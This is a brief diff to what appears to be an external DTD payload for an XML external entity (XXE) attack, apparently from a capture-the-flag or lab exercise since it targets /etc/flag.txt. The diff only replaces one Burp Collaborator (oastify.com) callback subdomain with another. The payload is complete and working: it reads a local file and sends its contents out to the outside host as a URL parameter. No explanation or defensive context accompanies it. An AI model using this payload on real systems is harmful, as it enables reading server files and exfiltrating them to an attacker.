@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/flag.txt">
-<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://l1nyxunsv6geldhp9bvufbtt9kfc36rv.oastify.com/?data=%file;'>">
+<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://2beaivrlxfrbc70teu3gd5lez55wtohd.oastify.com/?data=%file;'>">
 %exfil;
